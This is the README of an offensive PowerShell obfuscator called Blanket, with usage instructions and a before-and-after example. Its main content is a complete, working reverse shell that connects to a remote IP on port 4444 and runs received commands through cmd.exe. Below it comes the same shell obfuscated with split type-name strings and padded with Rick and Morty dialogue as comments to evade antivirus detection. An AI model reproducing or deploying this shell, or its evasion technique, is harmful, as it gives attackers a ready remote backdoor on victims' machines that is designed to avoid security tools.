# Blanket

````
▀█████████▄   ▄█          ▄████████ ███▄▄▄▄      ▄█   ▄█▄    ▄████████     ███     
  ███    ███ ███         ███    ███ ███▀▀▀██▄   ███ ▄███▀   ███    ███ ▀█████████▄ 
  ███    ███ ███         ███    ███ ███   ███   ███▐██▀     ███    █▀     ▀███▀▀██ 
 ▄███▄▄▄██▀  ███         ███    ███ ███   ███  ▄█████▀     ▄███▄▄▄         ███   ▀ 
▀▀███▀▀▀██▄  ███       ▀███████████ ███   ███ ▀▀█████▄    ▀▀███▀▀▀         ███     
  ███    ██▄ ███         ███    ███ ███   ███   ███▐██▄     ███    █▄      ███     
  ███    ███ ███▌    ▄   ███    ███ ███   ███   ███ ▀███▄   ███    ███     ███     
▄█████████▀  █████▄▄██   ███    █▀   ▀█   █▀    ███   ▀█▀   ██████████    ▄████▀   
             ▀                                  ▀                                  
````

If you are worried about being found perhaps try taking cover under a blanket.

Pure Python PowerShell Obfuscator 
****
**Usage**

`git clone https://github.com/warren2i/Blanket`

`cd Blanket`



`usage: Blanket.py [-h] -i IP -p PORT [-o OUTFILE] [-s SCRIPT] [-v VARSIZE]
`
****
**FROM THIS**

```$socket = new-object System.Net.Sockets.TcpClient('192.168.56.101', 4444);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

**TO THIS** 
```$jIXFgQanbD = "Syst"
<# Jerry  Well  duh doy  son  Look  I love you  Morty  but we both know you re not as fast as the other kids  and if you want to compete in this world  you got to work twice as hard   #>
$ARXnYkEGqw = "em.N"
<# Morty  Uuuh   #>
$wSZMLtSCNA = "et.S"
<# Jessica  Can I show these to you   Jessica opens her shirt  showing Morty her breasts   #>
$hWVEIzFKHR = "ocke"
<# Jerry  No  I I understand  Uh  maybe we overreacted  But he has to keep going to school   #>
$lDnUhrDSGw = "ts.T"
<# Morty  I don t care about Jessica  Y Yyyyyyyyyyou�    #>
$aRBYRkGFUw = "cpCl"
<# Jerry  I m an angry father  not an improviser   #>
$kXBLnxbVkq = "ient"
<# Mr  Goldenfold  Five more minutes of this  and I m gonna get mad   leans back and bites his lip   #>
$jFOPXASzCc = "Syste"
<# Glenn  Aaaaah  My leg is shot off   #>
$SPJkhQzvSx = "m.IO."
<# Morty  I wasn t kissing a pillow  mom  I just I didn t get a lot of sleep last night  Maybe my dreams were just too loud or something   #>
$HBxMZKRsex = "Strea"
<# Morty   rubs his eyes  What  Rick  What�  s going on   #>
$NQbpEvtWIi = "mWrit"
<# Rick  You know what  Morty  You re right   throws empty bottle into the backseat  Let s forget the girl altogether  She  she s probably nothing but trouble  anyways   presses a button   #>
$WBpIsOyusc = "er"
<# Morty  In my butt   #>
$ccPCTjvCMR = "Syste"
<# Morty  All right  all right  So  what s so special about these seeds  anyways   #>
$QGNWUyjRyA = "m.Byt"
<# Rick  Well  somebody s got to do it  Morty  Th these seeds aren t gonna get through customs unless they re in someone s rectum  Morty  #>
$GZSdvCoHYt = "e"
<# Beth  Dad   #>
$GUxCXYklTR = "Syst"
<#  Open to Smith residence  dining room   #>
$jmgKZRfvsC = "em.T"
<# Mr  Goldenfold  Morty   #>
$dbYEHnzBop = "ext."
<# Rick  You you don t have to worry about me getting with Jessica or anything  Sh sh she�   she  she  she s all for you  Morty   #>
$PCZxvNmpro = "Asci"
<# Rick  I I get what you re trying to say  Morty  Listen  I m not     spills alcohol down his shirt  You don t got    Y you don�  t gotta worry about me trying to fool around with Jessica or mess around with Jessica or anything  I m not that kind of guy  Morty   #>
$esduLAahPr = "iEnc"
<#  Cut to opening theme   #>
$vVAAgyplvP = "odin"
<# Jerry  You re beyond our reasoning   #>
$xNZyQeUbTR = "g"
<# Morty  I don t know  Rick  I can t leave school again   #>
$FJNkOHPvWy = "Sys"
<# Rick  I m sorry  Morty  It s a bummer  In reality  you re as dumb as they come and I needed those seeds real bad  and I had to give them up just to get your parents off my back  so now we re gonna have to go get more adventures   excitedly looks down upon him  telling him about their future adventures  And then we re gonna go on even more adventures after that  Morty and you re gonna keep your mouth shut about it  Morty  because the world is full of idiots that don t understand what s important  and they ll tear us apart  Morty but if you stick with me  I m gonna accomplish great things  Morty  and you re gonna be part of them  and together  we re gonna run around  Morty  We re gonna do all kinds of wonderful things  Morty  Just you and me  Morty  The outside world is our enemy  Morty  We re the only friends we ve got  Morty  It s just Rick and Morty  Rick and Morty and their adventures  Morty  Rick and Morty forever and forever  Morty s things  Me and Rick and Morty running around  and Rick and Morty time  All day long  forever  All a hundred days  Rick and Morty forever 100 times  Over and over  rickandmortyadventures com  All 100 years  Every minute  rickandmorty com  #>
$tohkNfQwCy = "tem"
<# Summer  AAAAAAAAAAAHHHHH         #>
$JbLbrLvdyf = ".Di"
<# Morty  Jessica   #>
$HMlLxsKPSc = "agn"
<# Morty  Wow  that s pretty crazy  Rick   #>
$Hxbsjxkfxr = "ost"
<# Morty  Yeah  Rick    I it s great  Is this the surprise   #>
$REUmAoGMOk = "ics"
<# Morty  Aaaaaah   #>
$PmYpUGHIpa = ".Pr"
<# Morty  T t that s absolutely crazy   #>
$rJHkQVPetv = "oce"
<# Jerry  Well  now you can build baskets and watch Paul Newman movies on VHS and mentally scar the Boy Scouts every Christmas   #>
$IeQphreyRZ = "ss"
<# Morty  T t that s absolutely crazy   #>
$oLOGpJcRIn = "Syst"
<# Morty  Aaaaah   #>
$ZHPsmWswyu = "em.D"
<# Gromflomite  Random check  He s got to go through the new machine   #>
$trcAonFmHN = "iagn"
<# Rick  Put them way up inside there  as far as they can fit   #>
$wMndUlIRmL = "osti"
<# Jerry  But�    #>
$ZRdkiMFsUl = "cs.P"
<# Jessica  You re Morty  right   #>
$TxZKqeYZFS = "roce"
<# Morty  Uh oh   #>
$cCoELQlGgW = "ss"
<# Rick  HOLY CRAP  MORTY RUN     they take off  running in complete and total fear as the monster chases them   #>
$qiWhuJGxwI = new-object $jIXFgQanbD$ARXnYkEGqw$wSZMLtSCNA$hWVEIzFKHR$lDnUhrDSGw$aRBYRkGFUw$kXBLnxbVkq('192.168.0.30', 4444);
<# Jerry  Well  now you can build baskets and watch Paul Newman movies on VHS and mentally scar the Boy Scouts every Christmas   #>
if($qiWhuJGxwI -eq $rAQVEYeUkX){exit 1}
<# Jessica  You re Morty  right   #>
$GMRilHjFFt = $qiWhuJGxwI.GetStream();
<# Announcer  The glarp zone is for flarping and unglarping only   #>
$wdosspwpUlDUCxjSMOa = new-object $jFOPXASzCc$SPJkhQzvSx$HBxMZKRsex$NQbpEvtWIi$WBpIsOyusc($GMRilHjFFt);
<# Rick  Morty  I had to    I had to do it  I had�   I had to�   I had to make a bomb  Morty  I had to create a bomb   #>
$mpExOgyAGZ = new-object $ccPCTjvCMR$QGNWUyjRyA$GZSdvCoHYt[] 1024;
<# Morty  Ohhhhh   Rick pushes over a giant capsule  with an alien fetus over  smashing some Gromflomites  to slow them down   #>
$CABnIxyBoA = new-object $GUxCXYklTR$jmgKZRfvsC$dbYEHnzBop$PCZxvNmpro$esduLAahPr$vVAAgyplvP$xNZyQeUbTR;
<# Principal Vagina  I done been notifying you  Have you not been getting the messages I ve been leaving with Morty s grandfather   #>
do
<# Glenn  Aaaaah  My leg is shot off   #>
{
<# Jerry  Okay  Let s not rehash that fight  I sense that you re busy and will now be on my way   drops a pamphlet on the ground   #>
	$wdosspwpUlDUCxjSMOa.Flush();
<# Jerry  Since we re fighting  if you ever have an affair with that guy  I will come to the hotel room and blow my brains out all over your naked bodies   #>
	$kcoiwJpEtg = $rAQVEYeUkX;
<#  Cut to alleyway   #>
	$TNdIEJtjbz = ""
<# and wipes food from his face  I told you not to practice kiss the living room  #>
	while($GMRilHjFFt.DataAvailable -or $kcoiwJpEtg -eq $rAQVEYeUkX) {
<# Morty  Aaaaah   #>
		$kcoiwJpEtg = $GMRilHjFFt.Read($mpExOgyAGZ, 0, 1024)
<# Beth  What does that mean   #>
	}
<# Morty  The mega trees   #>
	$tTlkCpmIBZ = $CABnIxyBoA.GetString($mpExOgyAGZ, 0, $kcoiwJpEtg).Replace("`r`n","").Replace("`n","");
<# Rick  I m sorry  Morty  It s a bummer  In reality  you re as dumb as they come and I needed those seeds real bad  and I had to give them up just to get your parents off my back  so now we re gonna have to go get more adventures   excitedly looks down upon him  telling him about their future adventures  And then we re gonna go on even more adventures after that  Morty and you re gonna keep your mouth shut about it  Morty  because the world is full of idiots that don t understand what s important  and they ll tear us apart  Morty but if you stick with me  I m gonna accomplish great things  Morty  and you re gonna be part of them  and together  we re gonna run around  Morty  We re gonna do all kinds of wonderful things  Morty  Just you and me  Morty  The outside world is our enemy  Morty  We re the only friends we ve got  Morty  It s just Rick and Morty  Rick and Morty and their adventures  Morty  Rick and Morty forever and forever  Morty s things  Me and Rick and Morty running around  and Rick and Morty time  All day long  forever  All a hundred days  Rick and Morty forever 100 times  Over and over  rickandmortyadventures com  All 100 years  Every minute  rickandmorty com  #>
	if(!$tTlkCpmIBZ.equals("exit")){
<# Summer   sobs  What kind of God lets this happen   #>
		$QjYgRMQnFx = "";
<# Rick  What new   burps  what new machine   #>
		if($tTlkCpmIBZ.IndexOf(' ') -gt -1){
<# Morty  Ooh  Ohh  Ooh  Hnngh  Hoo  Ooh  Ohh  Aaaaagh  Oooooh   Rick finally returns and injects Morty s legs with medicine  healing them to perfection   #>
			$QjYgRMQnFx = $tTlkCpmIBZ.substring($tTlkCpmIBZ.IndexOf(' ')+1);
<# Rick  Okay  hold on just a second  Morty   opens another portal and leaves Morty behind  lying on the ground to suffer for a few seconds   #>
			$tTlkCpmIBZ = $tTlkCpmIBZ.substring(0,$tTlkCpmIBZ.IndexOf(' '));
<# Jerry  Okay  Let s not rehash that fight  I sense that you re busy and will now be on my way   drops a pamphlet on the ground   #>
			if($QjYgRMQnFx.split(' ').length -gt 1){
<# Morty  It s the middle of the night  What are you talking about   #>
                $jcsVYULIXR = New-Object $FJNkOHPvWy$tohkNfQwCy$JbLbrLvdyf$HMlLxsKPSc$Hxbsjxkfxr$REUmAoGMOk$PmYpUGHIpa$rJHkQVPetv$IeQphreyRZStartInfo
<# Tom   offscreen  Stabilized   #>
                $jcsVYULIXR.FileName = "cmd.exe"
<# Beth  Oh  don t high road us  dad  You know fully well that Morty is the last child that needs to be missing classes   #>
                $jcsVYULIXR.RedirectStandardError = $JXOLayffRt
<# Rick  When we get to customs  I m gonna need you to take these seeds into the bathroom  and I m gonna need you to put them way up inside your butthole  Morty   #>
                $jcsVYULIXR.RedirectStandardOutput = $JXOLayffRt
<# Jerry  Since we re fighting  if you ever have an affair with that guy  I will come to the hotel room and blow my brains out all over your naked bodies   #>
                $jcsVYULIXR.UseShellExecute = $wLjzibASsf
<# Rick  Yeah  and once those seeds wear off  you re gonna lose most of your motor skills  and you re also gonna lose a significant amount of brain functionality for 72 hours  Morty   #>
                $jcsVYULIXR.Arguments = "/c $tTlkCpmIBZ $QjYgRMQnFx"
<# Beth  We re moving you to a nursing home   #>
                $wdosspwpUl = New-Object $oLOGpJcRIn$ZHPsmWswyu$trcAonFmHN$wMndUlIRmL$ZRdkiMFsUl$TxZKqeYZFS$cCoELQlGgW
<# Jessica  Squeeze them  Manhandle them  Give them the business  See if you can shuffle them  I mean  really get in there and knock them around  No wrong answers   #>
                $wdosspwpUl.StartInfo = $jcsVYULIXR
<# Tom   offscreen  Losing him   Beth adjusts the organs again   #>
                $wdosspwpUl.Start() | Out-Null
<# Mr  Goldenfold  Morty   #>
                $wdosspwpUl.WaitForExit()
<# Morty  Yeah   Rick grabs Morty and takes him way   #>
                $JKsbJEchlT = $wdosspwpUl.StandardOutput.ReadToEnd()
<# Morty  Holy cow  Rick  I didn t know hanging out with you was making me smarter   #>
                $GdlRbXDbJA = $wdosspwpUl.StandardError.ReadToEnd()
<# Morty  I don t know  Rick  I can t leave school again   #>
                if ($wdosspwpUl.ExitCode -ne 0) {
<# Tom   offscreen  Okay  he s back   #>
                    $TNdIEJtjbz = $GdlRbXDbJA
<# Morty  Oh  geez  Rick  that s not good  W what are we gonna do  I I have to be back at school right now  How are we gonna get back home   #>
                } else {
<# Mr  Goldenfold  Five plus five   #>
                    $TNdIEJtjbz = $JKsbJEchlT
<# Rick  Are you joking me  I mean  look at all the crazy crap surrounding us  Look at that thing right there   a weird looking monster is seen cooing and rolling around on the ground  What the hell is that thing  You think you re gonna see that kind of thing at school   offscreen  Look at it just lumbering around   onscreen  It defies all logic  that thing   #>
                }
<# Jerry  I see there s a new episode of that singing show tonight  Who do you guys think is gonna be the best singer   Morty falls asleep at the table  smashing his face into his plate   #>
			}
<# Rick  All right  all right  calm down  Listen to me  Morty  I know that new situations can be intimidating  You re looking around  and it s all scary and different  but  you know  m meeting them head on  charging right into them like a bull that s how we grow as people  I m no stranger to scary situations  I deal with them all the time  Now  if you just stick with me  Morty  we re gonna be�    a gigantic alien monster suddenly appears behind them   #>
			else{
<# Rick  Do you have any concept of how much higher the stakes get out there  Morty  What do you think I can just do it all by myself  Come on   #>
				$TNdIEJtjbz = (&"$tTlkCpmIBZ" "$QjYgRMQnFx") | out-string;
<#  Cut to horse hospital   #>
			}
<# Tom   offscreen  Okay  he s back   #>
		}
<#  Cut to desert   #>
		else{
<# Jerry  Boom  Told you  In your face  He is ruining our child  Wait  what am I celebrating   #>
			$TNdIEJtjbz = (&"$tTlkCpmIBZ") | out-string;
<# Morty  Whoooooo   he and Rick run through the equipment on the ceiling  before they slip off to the ground   #>
		}
<# Morty  Oh  man   #>
		if($TNdIEJtjbz -ne $rAQVEYeUkX){
<# Mr  Goldenfold  Morty  What are you doing to me    #>
        $wdosspwpUlDUCxjSMOa.WriteLine($TNdIEJtjbz)
<# Davin  Scalpel   Jerry enters the room   #>
    }
<# Morty  Jessica   #>
	}
<# Rick   Rick lands the cruiser in an open desert  he opens the door and tumbles out among dozens of empty alcohol cans and bottles  We ll park it right here  Morty  Right here on the side of the ree    road here   #>
}While (!$tTlkCpmIBZ.equals("exit"))
<# Morty  Je Jessica  Jessica   #>
$wdosspwpUlDUCxjSMOa.close();
<# Beth  You know what  Okay   she and Jerry leave   #>
$qiWhuJGxwI.close();
<# Jerry  Well  duh doy  son  Look  I love you  Morty  but we both know you re not as fast as the other kids  and if you want to compete in this world  you got to work twice as hard   #>
$GMRilHjFFt.Dispose()
<# Mr  Goldenfold  Okay  good  It s time for the quiz   #>```